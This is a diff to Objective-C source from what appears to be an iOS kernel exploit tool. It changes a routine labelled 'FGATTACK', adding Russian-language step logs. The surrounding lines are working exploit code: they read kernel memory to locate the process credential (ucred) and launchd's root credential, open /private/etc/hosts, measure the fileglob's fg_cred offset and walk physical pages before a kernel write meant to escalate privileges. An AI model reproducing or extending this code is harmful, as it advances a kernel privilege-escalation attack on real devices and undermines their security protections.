@@ -2309,6 +2309,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     uint64_t curUcred = kpLooksLikeKernelPointer(procRo) ? kp_untag_ptr(early_kread64(procRo + koffsetof(proc_ro, ucred))) : 0;
     kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] proc=%#llx proc_ro=%#llx ucred=%#llx", (unsigned long long)selfProc, (unsigned long long)procRo, (unsigned long long)curUcred]);
     if (!kpLooksLikeKernelPointer(curUcred)) { [r appendString:@"[RESULT] АТАКА: FAIL — ucred не найден\n"]; return r; }
+    kpNote(r, @"  [FGATTACK] step2: ucred найден");
     // --- FGATTACK body (kwrite-only, type-gated) ---
             {
                 uint64_t ldProc = [self findProcByPid:1 log:nil];
@@ -2320,6 +2321,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                     kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] launchd ucred=%#llx uid=%u", (unsigned long long)ldUc, ldUid]);
                     if (ldUid == 0 && kpLooksLikeKernelPointer(ldUc)) rootZVA = ldUc;
                 }
+                kpNote(r, @"  [FGATTACK] step3: открываю hosts");
                 int tfd = open("/private/etc/hosts", O_RDONLY);
                 kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] rootZVA=%#llx hosts fd=%d", (unsigned long long)rootZVA, tfd]);
                 uint64_t fpRaw = 0, globRaw = 0, fdOf = 0;
@@ -2340,7 +2342,9 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                         kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred offset=%@",
                                   fgOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", fgOff] : @"not found"]);
                     }
+                    kpNote(r, @"  [FGATTACK] step4: fg_cred измерен, запускаю walker (kvtophys) — следующая строка либо type, либо ребут");
                     uint64_t globPA = kpLooksLikeKernelPointer(glob) ? kvtophys(glob & ~0x3fffULL) : 0;
+                    kpNote(r, @"  [FGATTACK] step5: walker выжил");
                     int globT = globPA ? kpFrameTypeOf(globPA) : -1;
                     kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileglob pagePA=%#llx type=%d — kwrite %@",
                               (unsigned long long)globPA, globT,
